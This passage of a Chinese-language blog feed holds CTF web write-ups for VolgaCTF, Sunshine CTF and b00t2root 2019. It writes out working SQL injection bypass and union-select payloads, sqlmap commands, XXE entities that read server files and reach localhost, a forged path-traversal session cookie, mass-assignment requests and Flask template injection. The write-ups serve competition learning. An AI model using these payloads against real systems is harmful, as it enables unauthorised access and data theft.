class="string">"../../volga_adminpanel/sessions/euzb7bMKx-5F29b2xNobGTDoWXmVFlEM.json"</span>, secret);</div><div class="line">  <span class="keyword">var</span> data2 = cookie.serialize(name, signed2, options);</div><div class="line">  <span class="built_in">console</span>.log(data2)</div><div class="line"></div><div class="line"></div><div class="line">  debug(<span class="string">'set-cookie %s'</span>, data);</div><div class="line"></div><div class="line">  <span class="keyword">var</span> prev = res.getHeader(<span class="string">'set-cookie'</span>) || [];</div><div class="line">  <span class="keyword">var</span> header = <span class="built_in">Array</span>.isArray(prev) ? prev.concat(data) : [prev, data];</div><div class="line"></div><div class="line">  res.setHeader(<span class="string">'set-cookie'</span>, header)</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>index.js中增加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/payload`</span>,<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>)</span>&#123;</div><div class="line">  req.session.test=<span class="string">"test"</span>;</div><div class="line">  res.end(<span class="string">"OK"</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>config.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">whitelistPaths: [</div><div class="line">  <span class="string">'/api/login'</span>, <span class="string">'/api/logout'</span>,<span class="string">'/api/payload'</span></div><div class="line">]</div></pre></td></tr></table></figure><p>之后本地启动并访问 <img src="https://i.loli.net/2019/04/03/5ca43ff56b20d.png" alt="655D3C99-58E0-4B98-A334-AF401BD9C7A8.png"> 得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s%3A..%2F..%2Fvolga_adminpanel%2Fsessions%2Feuzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB%2FJ4sPnVj5QkDEuBu%2F0QelFQQqAV6yh4</div></pre></td></tr></table></figure><p>之后设置cookie字段进行提交即可得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -i http://gallery.q.2019.volgactf.ru/api/flag --cookie &quot;SESSION=s%3A..%2F..%2Fvolga_adminpanel%2Fsessions%2Feuzb7bMKx-5F29b2xNobGTDoWXmVFlEM.KrY7Bi6sZtBB%2FJ4sPnVj5QkDEuBu%2F0QelFQQqAV6yh4&quot; -L</div></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/03/5ca440109c090.png" alt="63B08906-2188-472C-AC0C-4FB2634C838E.png"></p><p> flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">VolgaCTF&#123;31c2ac53d4101a01264775328797d424&#125;</div></pre></td></tr></table></figure><h2 id="0x04-Blog"><a href="#0x04-Blog" class="headerlink" title="0x04 Blog"></a>0x04 Blog</h2><h2 id="0x05-Shop-V-2"><a href="#0x05-Shop-V-2" class="headerlink" title="0x05 Shop V.2"></a>0x05 Shop V.2</h2><ol><li>信息泄露 robots.txt-&gt;shop.1.0.1.war</li><li>代码审计 这个版本在buy路由处已经修复了1.0.0版本的自动绑定漏洞，但是在profile是存在的，并且可以控制一些变量，此版本我们可以看到user类中多了对cart的处理，所以考虑使用cart来完成。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> List&lt;Product&gt; <span class="title">getCartItems</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.cart;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCartItems</span><span class="params">(List&lt;Product&gt; cart)</span> </span>&#123;</div><div class="line">    <span class="keyword">this</span>.cart = cart;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>我们继续在controller中看下id是被使用做判断product的id的，那么很明显了，我们只要修改一下id就好</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"/profile"</span>&#125;)</div><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">profile</span><span class="params">(@ModelAttribute(<span class="string">"user"</span>)</span> User user, Model templateModel, HttpServletRequest request) </span>&#123;</div><div class="line">    HttpSession session = request.getSession();</div><div class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">"user_id"</span>) == <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        List&lt;Product&gt; cart = <span class="keyword">new</span> ArrayList();</div><div class="line">        user.getCartItems().forEach((p) -&gt; &#123;</div><div class="line">            cart.add(<span class="keyword">this</span>.productDao.geProduct(p.getId()));</div><div class="line">        &#125;);</div><div class="line">        templateModel.addAttribute(<span class="string">"cart"</span>, cart);</div><div class="line">        <span class="keyword">return</span> <span class="string">"profile"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">POST /profile HTTP/1.1</div><div class="line">Host: shop2.q.2019.volgactf.ru</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://shop2.q.2019.volgactf.ru/index</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 30</div><div class="line">Connection: close</div><div class="line">Cookie: JSESSIONID=C77EBD253171F45F0E5F18DC4AB68B57</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">name=zeroyu&amp;CartItems[0].id=4</div></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">VolgaCTF&#123;e86007271413cc1ac563c6eca0e12b62&#125;</div></pre></td></tr></table></figure>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Sunshine CTF 2019 Web</title>
      <link href="/2019/04/02/Sunshine-CTF-2019-Web/"/>
      <url>/2019/04/02/Sunshine-CTF-2019-Web/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>比赛地址: <a href="https://2019.sunshinectf.org/challenges" target="_blank" rel="external">https://2019.sunshinectf.org/challenges</a></p><p>时间: 星期日, 30 三月 2019, 1:00 AM (1:00) — 星期一, 01 四月 2019, 1:00 PM (13:00) </p><h2 id="0x01-WrestlerBook"><a href="#0x01-WrestlerBook" class="headerlink" title="0x01 WrestlerBook"></a>0x01 WrestlerBook</h2><h3 id="1-题目描述"><a href="#1-题目描述" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>WrestlerBook is the social network for wrestlers, by wrestlers. WrestlerBook is exclusively for wrestlers, so if you didn’t get an invite don’t even bother trying to view our profiles.</p><p><a href="http://bk.sunshinectf.org" target="_blank" rel="external">http://bk.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>看到登录界面先尝试使用万能密码进行fuzz一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">admin&apos; --</div><div class="line">admin&apos; #</div><div class="line">admin&apos;/*</div><div class="line">&apos; or 1=1--</div><div class="line">&apos; or 1=1#</div><div class="line">&apos; or 1=1/*</div><div class="line">&apos;) or &apos;1&apos;=&apos;1--</div><div class="line">&apos;) or (&apos;1&apos;=&apos;1--</div><div class="line">&apos; or 1;#</div></pre></td></tr></table></figure><p>最终发现<code>&#39; or 1=1--</code>等几个可以成功登录，并且在登录之后我发现存在flag关键词并且对应的值为N/A <img src="https://i.loli.net/2019/04/02/5ca2bd3740165.png" alt="974FFF3C-D28B-48DB-A3F3-6B7986022982.png"></p><p>并且在fuzz过程中发现会出现如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line">Date: Mon, 01 Apr 2019 14:24:46 GMT</div><div class="line">Server: Apache/2.4.25 (Debian)</div><div class="line">Vary: Accept-Encoding</div><div class="line">X-Powered-By: PHP/7.0.33</div><div class="line">Content-Length: 380</div><div class="line">Connection: Close</div><div class="line"></div><div class="line">&lt;br /&gt;</div><div class="line">&lt;b&gt;Warning&lt;/b&gt;:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: &amp;quot;#&amp;quot; in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;19&lt;/b&gt;&lt;br /&gt;</div><div class="line">&lt;br /&gt;</div><div class="line">&lt;b&gt;Fatal error&lt;/b&gt;:  Uncaught Error: Call to a member function fetchArray() on boolean in /var/www/html/login.php:20</div><div class="line">Stack trace:</div><div class="line">#0 &#123;main&#125;</div><div class="line">  thrown in &lt;b&gt;/var/www/html/login.php&lt;/b&gt; on line &lt;b&gt;20&lt;/b&gt;&lt;br /&gt;</div></pre></td></tr></table></figure><p>其实后面的工作可以直接使用sqlmap来进行了</p><p><img src="https://i.loli.net/2019/04/02/5ca2bd547fe01.png" alt="6930ECB0-5A74-4EA4-89FC-32445C4443D4.png"></p><p>要注意一下sqlite中包含各种信息的表是sqlite_master。</p><p>所以使用sqlmap默认去跑的话是注不出数据的 首先猜解下<code>sqlite_master</code>表中的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; --columns</div></pre></td></tr></table></figure><p>可以看到关键信息有name，但是关键的sql就没有显示 之后查name中有什么信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;name&quot; --dump</div></pre></td></tr></table></figure><p>但是直接注name中的user表，是跑不出信息的。所以我们查一下sql表中的信息，看user表是怎样构成的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r sqli.txt -T &quot;sqlite_master&quot; -C &quot;sql&quot; --dump</div></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2bd6a7ae08.png" alt="708F625A-1562-4597-B481-AA68C38283F2.png"></p><p> 表结构出来了之后直接查flag就好了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -r sqli.txt --sql-query=&quot;SELECT group_concat(flag) FROM users&quot;</div></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2bd7e30458.png" alt="屏幕快照 2019-04-02 上午9.17.45.png"></p><p>手动注入参考： <a href="https://ctftime.org/writeup/14208" target="_blank" rel="external">https://ctftime.org/writeup/14208</a></p><p>关键payload记录</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Username: admin</div><div class="line">Password: ' union SELECT 1, 2, group_concat(name), 4, group_concat(sql), 6, 7, 8 FROM sqlite_master WHERE type = "table";#</div></pre></td></tr></table></figure><p>获取表的结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`users`</span> (</div><div class="line">    <span class="string">`username`</span>  <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`password`</span>  <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`avatar`</span>    <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`age`</span>   <span class="built_in">INTEGER</span>,</div><div class="line">    <span class="string">`name`</span>  <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`title`</span> <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`flag`</span>  <span class="built_in">TEXT</span>,</div><div class="line">    <span class="string">`id`</span>    <span class="built_in">INTEGER</span> PRIMARY <span class="keyword">KEY</span> AUTOINCREMENT</div><div class="line">),<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> sqlite_sequence(<span class="keyword">name</span>,seq)</div></pre></td></tr></table></figure><p>dump flag</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Username: admin</div><div class="line">Password: ' union SELECT group_concat(username), group_concat(password), group_concat(avatar), group_concat(age), group_concat(name), group_concat(title), group_concat(flag), group_concat(id) FROM users;#</div></pre></td></tr></table></figure><p>返回值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"desc"</span>&gt;</span>Flag: N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,example_flag,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,N/A,sun&#123;ju57_4n07h3r_5ql1_ch4llspan class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure><h2 id="0x02-Wrestler-Name-Generator"><a href="#0x02-Wrestler-Name-Generator" class="headerlink" title="0x02 Wrestler Name Generator"></a>0x02 Wrestler Name Generator</h2><h3 id="1-题目描述-1"><a href="#1-题目描述-1" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.</p><p><a href="http://ng.sunshinectf.org" target="_blank" rel="external">http://ng.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-解题思路-1"><a href="#2-解题思路-1" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>关键点：可以看到我输入的名称之后还是完成的进行了显示，服务端脚本是PHP，并且请求的Accept字段中有xml，所以猜测可能是XXE</p><p>注意在使用paylaod是要先base64后url编码 进一步使用如下不合法的XML数据进行测试</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">xml</span> <span class="attr">version</span>=<span class="string">"abc"</span> ?&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">Doc</span>/&gt;</span></div></pre></td></tr></table></figure><p>观察到报错</p><p><img src="https://i.loli.net/2019/04/02/5ca2bd993f247.png" alt="33F95B3F-40F7-44B5-94E3-F2F866E8FCC5.png"></p><p> 确认是xxe漏洞，之后使用如下payload尝试去读取<code>generate.php</code>的源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&apos;1.0&apos; encoding=&apos;UTF-8&apos;?&gt;&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &apos;php://filter/convert.base64-encode/resource=generate.php&apos;&gt;]&gt;&lt;input&gt;&lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;&lt;/input&gt;</div></pre></td></tr></table></figure><p>服务端的源代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$whitelist = array(</div><div class="line">    &apos;127.0.0.1&apos;,</div><div class="line">    &apos;::1&apos;</div><div class="line">);</div><div class="line">// if this page is accessed from the web server, the flag is returned</div><div class="line">// flag is in env variable to avoid people using XXE to read the flag</div><div class="line">// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)</div><div class="line">if(in_array($_SERVER[&apos;REMOTE_ADDR&apos;], $whitelist))&#123;</div><div class="line">echo $_ENV[&quot;FLAG&quot;];</div><div class="line">return;</div><div class="line">&#125;</div><div class="line">// make sure the input parameter exists</div><div class="line">if (empty($_GET[&quot;input&quot;])) &#123;</div><div class="line">echo &quot;Please include the &apos;input&apos; get parameter with your request, Brother&quot;;</div><div class="line">return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// get input</div><div class="line">$xmlData = base64_decode($_GET[&quot;input&quot;]);</div><div class="line">// parse xml</div><div class="line">$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die(&quot;Error parsing XML: &quot;.&quot;\n&quot;.$xmlData);</div><div class="line">$firstName = $xml-&gt;firstName;</div><div class="line">$lastName = $xml-&gt;lastName;</div><div class="line">// generate name</div><div class="line">$nouns = array(&quot;Killer&quot;, &quot;Savage&quot;, &quot;Stallion&quot;, &quot;Coder&quot;, &quot;Hacker&quot;, &quot;Slasher&quot;, &quot;Crusher&quot;, &quot;Barbarian&quot;, &quot;Ferocious&quot;, &quot;Fierce&quot;, &quot;Vicious&quot;, &quot;Hunter&quot;, &quot;Brute&quot;, &quot;Tactician&quot;, &quot;Expert&quot;);</div><div class="line">$noun = $nouns[array_rand($nouns)];</div><div class="line">$generatedName = $firstName.&apos; &quot;The &apos;.$noun.&apos;&quot; &apos;.$lastName;</div><div class="line"></div><div class="line">// return html for the results page</div><div class="line">echo &lt;&lt;&lt;EOT</div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=&quot;en&quot;&gt;</div><div class="line">&lt;head&gt;</div><div class="line">  &lt;title&gt;Wrestler Name Generator&lt;/title&gt;</div><div class="line">  &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</div><div class="line">  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css&quot;&gt;</div><div class="line">  &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">  &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">  &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;div class=&quot;jumbotron text-center&quot;&gt;</div><div class="line">  &lt;h1&gt;Your Wrestler Name Is:&lt;/h1&gt;</div><div class="line">  &lt;h2&gt;$generatedName&lt;/h2&gt; </div><div class="line">&lt;!--hacker name functionality coming soon!--&gt;</div><div class="line">&lt;!--if you&apos;re trying to test the hacker name functionality, make sure you&apos;re accessing this page from the web server--&gt;</div><div class="line">&lt;!--&lt;h2&gt;Your Hacker Name Is: REDACTED&lt;/h2&gt;--&gt;</div><div class="line">  &lt;a href=&quot;/&quot;&gt;Go Back&lt;/a&gt; </div><div class="line">&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div><div class="line">EOT;</div><div class="line">?&gt;</div></pre></td></tr></table></figure><p>从源码上来看只要从本地访问<code>generate.php</code>文件就可以获取flag，所以使用如下payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">'1.0'</span> encoding=<span class="string">'UTF-8'</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM 'http://localhost/generate.php'&gt;]&gt;</span><span class="tag">&lt;<span class="name">input</span>&gt;</span><span class="tag">&lt;<span class="name">firstName</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span><span class="tag">&lt;/<span class="name">input</span>&gt;</span></div></pre></td></tr></table></figure><p>返回的结果 <code>sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}</code></p><h2 id="0x03-Portfolio"><a href="#0x03-Portfolio" class="headerlink" title="0x03 Portfolio"></a>0x03 Portfolio</h2><h3 id="1-题目描述-2"><a href="#1-题目描述-2" class="headerlink" title="1.题目描述"></a>1.题目描述</h3><p>Check out my development portfolio! I’m just getting started, so don’t be too mean :(</p><p><a href="http://folio.sunshinectf.org" target="_blank" rel="external">http://folio.sunshinectf.org</a></p><p>Author: dmaria</p><h3 id="2-解题思路-2"><a href="#2-解题思路-2" class="headerlink" title="2.解题思路"></a>2.解题思路</h3><p>首先web框架是flask；其次可以看到URL后面的参数是name，而页面对应的也是name；如果修改为zeroyu，则页面对应也显示zeroyu</p><p><img src="https://i.loli.net/2019/04/02/5ca2bdbf309c4.png" alt="7DBD4583-BD88-4783-86A8-613E8BF18018.png"></p><p> 但是如果我输入<code>9</code>的话并不会产生对应的计算</p><p><img src="https://i.loli.net/2019/04/02/5ca2bdd1e09fc.png" alt="7001968E-4A77-4187-9DFB-A4985F9085C2.png"></p><p> 之后访问另外一个界面，查看源代码发现一行提交信息被注释掉了，编辑html将注释去除并进行提交。 <img src="https://i.loli.net/2019/04/02/5ca2bde9f0ac0.png" alt="8156B4B1-2EE4-4BA2-BDF1-D0179ED07027.png"></p><p>但是并没有什么效果，所以不妨直接访问一下对应的路径，而不使用这个模板参数。 <code>http://folio.sunshinectf.org/templates/admin.html</code> 得到一些返回信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% if config.DEBUG %&#125; &#123;&#123;config.FLAG&#125;&#125; &#123;% endif %&#125; Hi there!</div></pre></td></tr></table></figure><p>所以可以看到flag是在config中的，所以我们构造如下payload并利用<code>http://folio.sunshinectf.org/render</code>这个点，最终成功get flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -i http://folio.sunshinectf.org/render --data &quot;template=hello/&#123;&#123;config.items()&#125;&#125;&quot; -L</div></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/02/5ca2be01903ae.png" alt="C67FB07F-C140-451D-B24D-EFF0AE88E180.png"></p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>b00t2root&#39;19 web writeup</title>
      <link href="/2019/04/01/b00t2root-19-web/"/>
      <url>/2019/04/01/b00t2root-19-web/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>比赛地址: <a href="http://3.17.26.191/" target="_blank" rel="external">http://3.17.26.191/</a></p><p>时间: 星期五, 三月 29, 11:30 PM (23:00) — 星期六, 三月 30, 11:30 PM (23:00)</p><h2 id="0x01-EasyPhp"><a href="#0x01-EasyPhp" class="headerlink" title="0x01 EasyPhp"></a>0x01 EasyPhp</h2><p>此题共分为以下三步：</p><ol><li>关于PHP 0e[0-9]+格式md5的弱类型校验</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$str1 = $_GET[<span class="string">'1'</span>]; </div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'1'</span>]))&#123; </div><div class="line">    <span class="keyword">if</span>($str1 == md5($str1))&#123; </div><div class="line">        <span class="keyword">echo</span> $flag1; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">        <span class="keyword">die</span>(); </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">else</span>&#123; </div><div class="line">    <span class="keyword">die</span>();    </div><div class="line">&#125;</div></pre></td></tr></table></figure><ol><li>关于PHP hash函数的弱类型校验=&gt;数组形式2[]=1&amp;3[]=2使其返回null进而弱类型相等</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$str2 = $_GET[<span class="string">'2'</span>]; </div><div class="line">$str3 = $_GET[<span class="string">'3'</span>]; </div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'3'</span>]))&#123; </div><div class="line">    <span class="keyword">if</span>($str2 !== $str3)&#123; </div><div class="line">        <span class="keyword">if</span>(hash(<span class="string">'md5'</span>, $salt . $str2) == hash(<span class="string">'md5'</span>, $salt . $str3))&#123; </div><div class="line">            <span class="keyword">echo</span> $flag2; </div><div class="line">        &#125; </div><div class="line">        <span class="keyword">else</span>&#123; </div><div class="line">            <span class="keyword">die</span>(); </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">        <span class="keyword">die</span>(); </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line"><span class="keyword">else</span>&#123; </div><div class="line">    <span class="keyword">die</span>();    </div><div class="line">&#125;</div></pre></td></tr></table></figure><ol><li>PHP的序列化与反序列的引用类型<br>题目的源代码</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Secrets</span> </span>&#123; </div><div class="line">    <span class="keyword">var</span> $temp; </div><div class="line">    <span class="keyword">var</span> $flag; </div><div class="line">&#125; </div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'4'</span>])) &#123; </div><div class="line">    $str4 = $_GET[<span class="string">'4'</span>]; </div><div class="line"></div><div class="line">    